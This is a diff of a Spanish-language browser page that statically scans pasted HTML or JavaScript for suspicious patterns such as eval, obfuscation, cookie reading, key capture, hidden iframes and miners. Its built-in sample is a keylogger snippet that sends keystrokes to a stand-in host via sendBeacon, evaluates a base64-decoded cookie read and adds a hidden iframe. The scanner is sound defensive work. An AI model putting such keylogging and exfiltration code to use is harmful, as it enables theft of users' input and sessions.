@@ -1,161 +1,130 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <meta name="theme-color" content="#101827">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-title" content="LC Security Scanner">
-
-  <title>LC HTML Security Scanner</title>
-
-  <link rel="manifest" href="./manifest.json">
-  <link rel="stylesheet" href="./style.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Analizador de código</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted+Grotesk:wght@400;600;800&display=swap">
+<style>
+:root{--bg:#e8edf0;--card:#f7f9fa;--ink:#14232b;--mut:#5a6b74;--line:#c5d0d6;--teal:#0f5c63;--hi:#b3261e;--mid:#a85f00;--lo:#2f6f4a;--hib:#f6dcd9;--midb:#f6e6cc;--lob:#d9ecdf;--code:#e0e7eb;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#10191e;--card:#18262d;--ink:#e4edf1;--mut:#92a5ae;--line:#2c3f48;--teal:#5fc0c8;--hi:#ff8a80;--mid:#f0b45a;--lo:#7fd1a0;--hib:#3b1f1d;--midb:#3a2c12;--lob:#173325;--code:#0d1418}}
+:root[data-theme="dark"]{--bg:#10191e;--card:#18262d;--ink:#e4edf1;--mut:#92a5ae;--line:#2c3f48;--teal:#5fc0c8;--hi:#ff8a80;--mid:#f0b45a;--lo:#7fd1a0;--hib:#3b1f1d;--midb:#3a2c12;--lob:#173325;--code:#0d1418}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:"Schibsted Grotesk",system-ui,sans-serif;line-height:1.5}
+main{max-width:720px;margin:0 auto;padding:20px 16px 48px}
+h1{font-size:1.9rem;font-weight:800;letter-spacing:-.02em;margin:8px 0 4px}
+.sub{color:var(--mut);margin:0 0 18px;font-size:.95rem}
+textarea{width:100%;min-height:210px;resize:vertical;background:var(--code);color:var(--ink);border:1px solid var(--line);border-radius:8px;padding:12px;font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+textarea:focus,button:focus-visible{outline:2px solid var(--teal);outline-offset:2px}
+.row{display:flex;gap:8px;margin:10px 0 22px;flex-wrap:wrap}
+button{font:600 .95rem "Schibsted Grotesk",system-ui,sans-serif;border-radius:8px;padding:11px 18px;border:1px solid var(--line);background:var(--card);color:var(--ink);cursor:pointer}
+button.main{background:var(--teal);color:var(--bg);border-color:var(--teal);flex:1}
+#res{display:none}
+.sum{display:flex;gap:16px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin-bottom:14px}
+.ring{width:84px;height:84px;border-radius:50%;flex:none;display:grid;place-items:center;background:conic-gradient(var(--c) calc(var(--p)*1%),var(--line) 0)}
+.ring b{width:64px;height:64px;border-radius:50%;background:var(--card);display:grid;place-items:center;font-size:1.4rem}
+.sum h2{margin:0;font-size:1.25rem}.sum p{margin:2px 0 0;color:var(--mut);font-size:.9rem}
+.f{background:var(--card);border:1px solid var(--line);border-left-width:5px;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.f.s3{border-left-color:var(--hi)}.f.s2{border-left-color:var(--mid)}.f.s1{border-left-color:var(--lo)}
+.f h3{margin:0 0 2px;font-size:1rem;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.tag{font-size:.75rem;font-weight:600;padding:1px 8px;border-radius:99px}
+.s3 .tag{background:var(--hib);color:var(--hi)}.s2 .tag{background:var(--midb);color:var(--mid)}.s1 .tag{background:var(--lob);color:var(--lo)}
+.f p{margin:0 0 8px;color:var(--mut);font-size:.9rem}
+.hit{display:flex;gap:8px;font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;background:var(--code);border-radius:5px;padding:4px 8px;margin-top:4px;overflow-x:auto}
+.hit span:first-child{color:var(--mut);flex:none}.hit span:last-child{white-space:pre}
+.note{color:var(--mut);font-size:.82rem;margin-top:18px}
+</style>
 </head>
-
 <body>
-
-  <header class="header">
-    <div class="brand">
-      <div class="logo">LC</div>
-      <div>
-        <h1>HTML Security Scanner</h1>
-        <p>Analizador de seguridad de código HTML</p>
-      </div>
-    </div>
-  </header>
-
-  <main class="container">
-
-    <section class="intro">
-      <h2>Analiza tu código antes de ejecutarlo</h2>
-      <p>
-        Detecta patrones potencialmente peligrosos en archivos
-        HTML y fragmentos de código.
-      </p>
-    </section>
-
-    <section class="scanner-card">
-
-      <label for="htmlInput">Código HTML para analizar</label>
-
-      <textarea
-        id="htmlInput"
-        placeholder="Pega aquí tu código HTML..."
-        spellcheck="false"
-        autocapitalize="off"
-        autocomplete="off"
-      ></textarea>
-
-      <div class="file-selector">
-        <label for="fileInput">O selecciona un archivo HTML</label>
-
-        <input
-          type="file"
-          id="fileInput"
-          accept=".html,.htm,text/html"
-        >
-
-        <p id="fileName">Ningún archivo seleccionado</p>
-      </div>
-
-      <div class="actions">
-        <button id="analyzeBtn" class="primary" type="button">
-          🔍 Analizar código
-        </button>
-
-        <button id="clearBtn" class="secondary" type="button">
-          🗑️ Limpiar
-        </button>
-      </div>
-
-    </section>
-
-    <section id="resultSection" class="result-section" hidden>
-
-      <div class="result-header">
-        <h2>Resultado del análisis</h2>
-        <span id="riskBadge" class="risk-badge">
-          Pendiente
-        </span>
-      </div>
-
-      <h3 id="riskTitle">Resultado</h3>
-
-      <p id="riskDescription">
-        Aquí aparecerá el resumen del análisis.
-      </p>
-
-      <div class="score-container">
-        <div class="score-info">
-          <span>Puntuación de riesgo</span>
-          <strong id="riskScore">0/100</strong>
-        </div>
-
-        <div class="score-track">
-          <div id="scoreBar" class="score-bar"></div>
-        </div>
-      </div>
-
-      <div class="stats-grid">
-
-        <div class="stat-card critical">
-          <strong id="criticalCount">0</strong>
-          <span>Críticas</span>
-        </div>
-
-        <div class="stat-card high">
-          <strong id="highCount">0</strong>
-          <span>Altas</span>
-        </div>
-
-        <div class="stat-card medium">
-          <strong id="mediumCount">0</strong>
-          <span>Medias</span>
-        </div>
-
-        <div class="stat-card low">
-          <strong id="lowCount">0</strong>
-          <span>Bajas</span>
-        </div>
-
-      </div>
-
-      <div class="findings-container">
-        <h3>Hallazgos de seguridad</h3>
-
-        <div id="findingsList">
-          <!-- Los resultados se insertan desde app.js -->
-        </div>
-      </div>
-
-      <div class="actions">
-        <button id="exportBtn" class="primary" type="button">
-          📄 Exportar informe
-        </button>
-      </div>
-
-    </section>
-
-    <section class="notice">
-      <h3>⚠️ Aviso de seguridad</h3>
-      <p>
-        Este analizador realiza una revisión estática mediante
-        patrones conocidos. No ejecuta el código y no garantiza
-        que un archivo esté libre de amenazas. Un resultado sin
-        hallazgos no significa que el archivo sea completamente seguro.
-      </p>
-    </section>
-
-  </main>
-
-  <footer class="footer">
-    <p>LC HTML Security Scanner</p>
-    <p>Una herramienta de LC Proyectos Digitales</p>
-  </footer>
-
-  <script src="./app.js"></script>
-
+<main>
+<h1>Analizador de código</h1>
+<p class="sub">Pega HTML o JavaScript y revisa si contiene patrones sospechosos. El código nunca se ejecuta.</p>
+<textarea id="src" spellcheck="false" placeholder="Pega aquí el código a revisar"></textarea>
+<div class="row">
+<button class="main" id="go">Analizar código</button>
+<button id="ex">Cargar ejemplo</button>
+<button id="cl">Borrar</button>
+</div>
+<section id="res" aria-live="polite"></section>
+<p class="note">Es un análisis por patrones: un resultado bajo no garantiza que el código sea seguro, y uno alto no siempre significa que sea malicioso. Revisa cada hallazgo con criterio.</p>
+</main>
+<script>
+const R=[
+[3,25,"Ejecución dinámica de código","\\beval\\s*\\(|new\\s+Function\\s*\\(|set(?:Timeout|Interval)\\s*\\(\\s*[\"'`]","Ejecuta texto como si fuera código, la forma más común de esconder instrucciones."],
+[2,10,"Decodificación base64","\\batob\\s*\\(","Decodifica texto oculto. Revisa qué se hace con el resultado."],
+[2,12,"Texto armado con códigos","String\\.fromCharCode|\\bunescape\\s*\\(|(?:\\\\x[0-9a-f]{2}){6,}|(?:\\\\u[0-9a-f]{4}){6,}","Construye texto a partir de números o escapes para evitar que se lea."],
+[2,12,"Nombres de ofuscador","\\b_0x[0-9a-f]{3,}","Patrón típico de herramientas que ofuscan JavaScript."],
+[2,10,"Bloque largo codificado","[A-Za-z0-9+/]{200,}={0,2}","Cadena muy larga que parece datos o código codificado."],
+[3,20,"Lectura de cookies","document\\.cookie","Puede robar sesiones si los datos salen hacia otro sitio."],
+[2,10,"Envío de datos a la red","sendBeacon|XMLHttpRequest|\\bfetch\\s*\\(|new\\s+WebSocket","Verifica a qué dirección se envía y qué información lleva."],
+[2,12,"Captura de teclas","addEventListener\\s*\\(\\s*[\"']key(?:down|up|press)[\"']|onkey(?:down|up|press)\\s*=","Escucha lo que se escribe. Es normal en juegos y atajos, pero también en keyloggers."],
+[3,20,"iframe oculto","<iframe[^>]*(?:width\\s*=\\s*[\"']?0|height\\s*=\\s*[\"']?0|display\\s*:\\s*none|hidden)","Carga otra página sin que se vea."],
+[2,10,"Redirección o ventana nueva","location(?:\\.href|\\.replace|\\.assign)?\\s*=[^=]|window\\.open\\s*\\(","Puede llevar al usuario a otro sitio sin avisar."],
+[2,10,"document.write","document\\.write(?:ln)?\\s*\\(","Inserta contenido al cargar; se usa mucho para inyectar código."],
+[2,12,"Formulario hacia otro sitio","<form[^>]+action\\s*=\\s*[\"']https?://","Los datos del formulario se envían fuera de la página."],
+[2,8,"Permisos sensibles","getUserMedia|geolocation|clipboard\\.(?:read|write)|Notification\\.requestPermission","Pide cámara, micrófono, ubicación, portapapeles o notificaciones."],
+[3,30,"Minero de criptomonedas","coin-?hive|cryptonight|crypto-?loot|webminer|minero","Usa el dispositivo para minar sin permiso."],
+[1,5,"Scripts externos","<script[^>]+src\\s*=\\s*[\"']https?://","Carga código de otro sitio; confía solo en orígenes conocidos."],
+[1,5,"HTML dinámico","\\.(?:innerHTML|outerHTML)\\s*\\+?=","Riesgo de inyección si el contenido viene de datos externos."],
+[1,4,"javascript: o eventos en línea","javascript:|\\bon(?:error|load)\\s*=\\s*[\"']","Ejecuta código desde atributos del HTML."],
+[1,3,"Enlaces externos","https?://[^\\s\"'<>)]+","Direcciones a las que el código hace referencia."]
+];
+const $=id=>document.getElementById(id);
+function analyze(t){
+ const starts=[0];for(let i=0;i<t.length;i++)if(t[i]==="\n")starts.push(i+1);
+ const lineOf=p=>{let a=0,b=starts.length-1;while(a<b){const m=(a+b+1)>>1;starts[m]<=p?a=m:b=m-1}return a};
+ const lines=t.split("\n"),out=[];
+ R.forEach(([sev,w,name,pat,why])=>{
+  const re=new RegExp(pat,"gi"),seen=new Map();let m;
+  while((m=re.exec(t))){if(m[0]==="")re.lastIndex++;const n=lineOf(m.index);if(!seen.has(n))seen.set(n,m[0])}
+  if(seen.size)out.push({sev,w,name,why,hits:[...seen.keys()].map(n=>[n+1,lines[n]]),n:seen.size,id:name});
+ });
+ const has=n=>out.some(f=>f.name===n);
+ if(has("Captura de teclas")&&has("Envío de datos a la red"))out.push({sev:3,w:20,name:"Combinación: teclas + red",why:"Captura lo que se escribe y además puede enviarlo fuera. Es el patrón de un keylogger.",hits:[],n:1});
+ if(has("Lectura de cookies")&&has("Envío de datos a la red"))out.push({sev:3,w:20,name:"Combinación: cookies + red",why:"Lee cookies y tiene salida a la red: posible robo de sesión.",hits:[],n:1});
+ const long=[];lines.forEach((l,i)=>{if(l.length>1500)long.push([i+1,l])});
+ if(long.length)out.push({sev:1,w:6,name:"Líneas larguísimas",why:"Código minificado u ofuscado en una sola línea; difícil de revisar.",hits:long,n:long.length});
+ out.sort((a,b)=>b.sev-a.sev||b.w-a.w);
+ return out;
+}
+function render(f,t){
+ const box=$("res");box.style.display="block";box.textContent="";
+ if(!t.trim()){box.textContent="Pega primero el código que quieres revisar.";return}
+ const score=Math.min(100,f.reduce((s,x)=>s+(x.sev>1?x.w:Math.min(x.w,x.w)),0));
+ const lvl=score>=50?["Riesgo alto","var(--hi)","Hay señales fuertes. No lo uses ni lo abras hasta revisarlo línea por línea."]:score>=20?["Riesgo medio","var(--mid)","Hay elementos que conviene verificar antes de confiar en el código."]:["Riesgo bajo","var(--lo)","No se encontraron señales fuertes de código malicioso."];
+ const s=document.createElement("div");s.className="sum";
+ s.innerHTML='<div class="ring"><b></b></div><div><h2></h2><p></p></div>';
+ s.querySelector(".ring").style.cssText="--c:"+lvl[1]+";--p:"+score;
+ s.querySelector("b").textContent=score;s.querySelector("h2").textContent=lvl[0];s.querySelector("p").textContent=lvl[2];
+ box.appendChild(s);
+ const tags={3:"Grave",2:"Atención",1:"Informativo"};
+ f.forEach(x=>{
+  const d=document.createElement("div");d.className="f s"+x.sev;
+  const h=document.createElement("h3");h.textContent=x.name+" ";
+  const g=document.createElement("span");g.className="tag";g.textContent=tags[x.sev]+(x.hits.length?" · "+x.n+(x.n===1?" línea":" líneas"):"");
+  h.appendChild(g);d.appendChild(h);
+  const p=document.createElement("p");p.textContent=x.why;d.appendChild(p);
+  x.hits.slice(0,5).forEach(([n,l])=>{
+   const r=document.createElement("div");r.className="hit";
+   const a=document.createElement("span"),b=document.createElement("span");
+   a.textContent=n;b.textContent=l.trim().slice(0,140);r.append(a,b);d.appendChild(r);
+  });
+  box.appendChild(d);
+ });
+ box.scrollIntoView({behavior:"smooth",block:"start"});
+}
+$("go").onclick=()=>{const t=$("src").value;render(t.trim()?analyze(t):[],t)};
+$("cl").onclick=()=>{$("src").value="";$("res").style.display="none"};
+$("ex").onclick=()=>{$("src").value=`<script>
+var _0x4a2f=atob("ZG9jdW1lbnQuY29va2llOw==");
+document.addEventListener("keydown",function(e){
+  navigator.sendBeacon("https://ejemplo-sospechoso.test/log",e.key);
+});
+eval(_0x4a2f);
+<\/script>
+<iframe src="https://otro-sitio.test" width="0" height="0"></iframe>`};
+</script>
 </body>
 </html>
